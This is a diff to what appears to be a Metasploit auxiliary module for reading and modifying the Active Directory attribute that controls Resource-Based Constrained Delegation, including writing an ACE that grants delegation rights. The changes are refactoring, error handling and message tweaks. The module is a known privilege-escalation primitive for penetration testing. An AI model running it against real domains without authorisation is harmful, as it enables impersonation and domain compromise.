@@ -15,6 +15,10 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Role Base Constrained Delegation',
         'Description' => %q{
+          This module can read and write the necessary LDAP attributes to configure a particular object for Role Based
+          Constrained Delegation (RBCD). When writing, the module will add an access control entry to allow the account
+          specified in DELEGATE_FROM to the object specified in DELEGATE_TO. In order for this to succeed, the
+          authenticated user must have write access to the target object (the object specified in DELEGATE_TO).
         },
         'Author' => [
           'Podalirius', # Remi Gascou (@podalirius_), Impacket reference implementation
@@ -28,9 +32,9 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'License' => MSF_LICENSE,
         'Actions' => [
+          ['FLUSH', { 'Description' => 'Delete the security descriptor' }],
           ['READ', { 'Description' => 'Read the security descriptor' }],
           ['REMOVE', { 'Description' => 'Remove matching ACEs from the security descriptor DACL' }],
-          ['FLUSH', { 'Description' => 'Delete the security descriptor' }],
           ['WRITE', { 'Description' => 'Add an ACE to the security descriptor DACL' }]
         ],
         'DefaultAction' => 'READ',
@@ -55,6 +59,34 @@ class MetasploitModule < Msf::Auxiliary
         sid: sid
       }
     })
+  end
+
+  def fail_with_ldap_error(message)
+    ldap_result = @ldap.as_json['result']['ldap_result']
+    return if ldap_result['resultCode'] == 0
+
+    print_error(message)
+    # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
+    case ldap_result['resultCode']
+    when 1
+      fail_with(Failure::Unknown, "An LDAP operational error occurred. The error was: #{ldap_result['errorMessage'].strip}")
+    when 16
+      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist.')
+    when 50
+      fail_with(Failure::NoAccess, 'The LDAP operation failed due to insufficient access rights.')
+    when 51
+      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is too busy to perform the request.')
+    when 52
+      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is not currently available to process the request.')
+    when 53
+      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is unwilling to perform the request.')
+    when 64
+      fail_with(Failure::Unknown, 'The LDAP operation failed due to a naming violation.')
+    when 65
+      fail_with(Failure::Unknown, 'The LDAP operation failed due to an object class violation.')
+    end
+
+    fail_with(Failure::Unknown, "Unknown LDAP error occurred: result: #{ldap_result['resultCode']} message: #{ldap_result['errorMessage'].strip}")
   end
 
   def get_delegate_from_obj
@@ -84,8 +116,8 @@ class MetasploitModule < Msf::Auxiliary
       obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
     end
 
-    unless raw_obj['msDS-AllowedToActOnBehalfOfOtherIdentity'].empty?
-      obj['msDS-AllowedToActOnBehalfOfOtherIdentity'] = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(raw_obj['msDS-AllowedToActOnBehalfOfOtherIdentity'].first)
+    unless raw_obj[ATTRIBUTE].empty?
+      obj[ATTRIBUTE] = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(raw_obj[ATTRIBUTE].first)
     end
 
     obj
@@ -93,27 +125,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     ldap_connect do |ldap|
-      bind_result = ldap.as_json['result']['ldap_result']
+      validate_bind_success!(ldap)
 
-      # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
-      case bind_result['resultCode']
-      when 0
-        print_good('Successfully bound to the LDAP server!')
-      when 1
-        fail_with(Failure::NoAccess, "An operational error occurred, perhaps due to lack of authorization. The error was: #{bind_result['errorMessage']}")
-      when 7
-        fail_with(Failure::NoTarget, 'Target does not support the simple authentication mechanism!')
-      when 8
-        fail_with(Failure::NoTarget, "Server requires a stronger form of authentication than we can provide! The error was: #{bind_result['errorMessage']}")
-      when 14
-        fail_with(Failure::NoTarget, "Server requires additional information to complete the bind. Error was: #{bind_result['errorMessage']}")
-      when 48
-        fail_with(Failure::NoAccess, "Target doesn't support the requested authentication type we sent. Try binding to the same user without a password, or providing credentials if you were doing anonymous authentication.")
-      when 49
-        fail_with(Failure::NoAccess, 'Invalid credentials provided!')
-      else
-        fail_with(Failure::Unknown, "Unknown error occurred whilst binding: #{bind_result['errorMessage']}")
-      end
       if (@base_dn = datastore['BASE_DN'])
         print_status("User-specified base DN: #{@base_dn}")
       else
@@ -125,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       @ldap = ldap
 
-      obj = ldap_get("(sAMAccountName=#{datastore['DELEGATE_TO']})", attributes: ['sAMAccountName', 'ObjectSID', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+      obj = ldap_get("(sAMAccountName=#{datastore['DELEGATE_TO']})", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
       fail_with(Failure::NotFound, "Failed to find: #{datastore['DELEGATE_TO']}") unless obj
 
       send("action_#{action.name.downcase}", obj)
@@ -158,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
 
     security_descriptor = obj[ATTRIBUTE]
     unless security_descriptor.dacl && !security_descriptor.dacl.aces.empty?
-      print_status('No DACL ACEs are present, no changes are necessary.')
+      print_status('No DACL ACEs are present. No changes are necessary.')
       return
     end
 
@@ -166,7 +179,7 @@ class MetasploitModule < Msf::Auxiliary
     aces.delete_if { |ace| ace.body[:sid] == delegate_from['ObjectSid'] }
     delta = security_descriptor.dacl.aces.length - aces.length
     if delta == 0
-      print_status('No DACL ACEs matched, no changes are necessary.')
+      print_status('No DACL ACEs matched. No changes are necessary.')
       return
     else
       print_status("Removed #{delta} matching ACE#{delta > 1 ? 's' : ''}.")
@@ -176,17 +189,20 @@ class MetasploitModule < Msf::Auxiliary
     security_descriptor.dacl.acl_count.clear
     security_descriptor.dacl.acl_size.clear
 
-    unless @ldap.replace_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity', security_descriptor.to_binary_s)
-      print_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
-      return
+    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
+      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
     end
     print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
   end
 
   def action_flush(obj)
-    unless @ldap.delete_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity')
-      print_error('Failed to deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    unless obj[ATTRIBUTE]
+      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty. No changes are necessary.')
       return
+    end
+
+    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
+      fail_with_ldap_error('Failed to deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
     end
 
     print_good('Successfully deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
@@ -194,7 +210,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def action_write(obj)
     delegate_from = get_delegate_from_obj
-    if obj['msDS-AllowedToActOnBehalfOfOtherIdentity']
+    if obj[ATTRIBUTE]
       _action_write_update(obj, delegate_from)
     else
       _action_write_create(obj, delegate_from)
@@ -208,9 +224,8 @@ class MetasploitModule < Msf::Auxiliary
     security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
     security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])
 
-    unless @ldap.add_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity', security_descriptor.to_binary_s)
-      print_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
-      return
+    unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
+      fail_with_ldap_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
     end
     print_good('Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
   end
@@ -233,8 +248,8 @@ class MetasploitModule < Msf::Auxiliary
 
     security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])
 
-    unless @ldap.replace_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity', security_descriptor.to_binary_s)
-      print_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
+      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
       return
     end
     print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
